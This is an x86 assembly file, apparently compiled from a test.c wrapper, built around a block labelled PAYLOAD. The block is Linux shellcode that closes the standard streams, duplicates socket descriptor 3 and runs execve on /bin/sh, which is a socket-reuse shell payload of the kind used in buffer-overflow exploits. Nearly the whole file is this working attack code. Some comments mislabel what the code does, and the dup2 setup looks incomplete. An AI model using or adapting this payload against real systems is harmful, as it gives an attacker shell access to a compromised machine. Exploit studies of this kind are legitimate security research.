.file	"test.c"
	.text
.globl function
	.type	function, @function
function:
	pushl	%ebp
	movl	%esp, %ebp


	#PAYLOAD_START

	jmp L1				# Jumping to L1
	L2: 				

	xorl %eax, %eax			# Setting eax to 0

	#closing stdin
#	xorl %eax, %eax 		 Setting eax to 0
	movb %al, %bl
	movb $0x6, %al			# Setting eax to 6 (close)
	int $0x80

	#closing stdout
#	xorl %eax, %eax 		# Setting eax to 0
	movb $0x1, %bl
	movb $0x6, %al
	int $0x80

	#closing stderr
#	xorl %eax, %eax 		# Setting eax to 0
	movb $0x2, %bl
	movb $0x6, %al
	int $0x80

	#duplicating socket

	movb $0x3, %bl			# setting dup arg to socket
#	xorl %eax, %eax 		# Setting eax to 0
	movb $0x29, %al
	int $0x80	

	movb $0x29, %al	
	int $0x80

	movb $0x29, %al	
	int $0x80

	# Writing "/bin/sh" to the standard ouput

	xorl %eax, %eax
	popl %esi
	movb %al,0x7(%esi)		# NULL terminate /bin/sh
	push %eax
	push %esi

	xorl	%edx, %edx		# NULL in %edx
	movl	%esp, %ecx		# Address of array in %ecx
	movl	%esi, %ebx		# Address of /bin/sh in %ebx
	movb	$0xb, %al		# Set up for execve call in %eax
	int	$0x80			# Jump to kernel mode

	L1: call L2
	.string "/bin/sh"

	#PAYLOAD_END

	popl	%ebp
	ret
	.size	function, .-function
.globl main
	.type	main, @function
main:
	pushl	%ebp
	movl	%esp, %ebp
	call	function
	movl	$0, %eax
	popl	%ebp
	ret
	.size	main, .-main
	.ident	"GCC: (GNU) 4.4.7 20120313 (Red Hat 4.4.7-17)"
	.section	.note.GNU-stack,"",@progbits
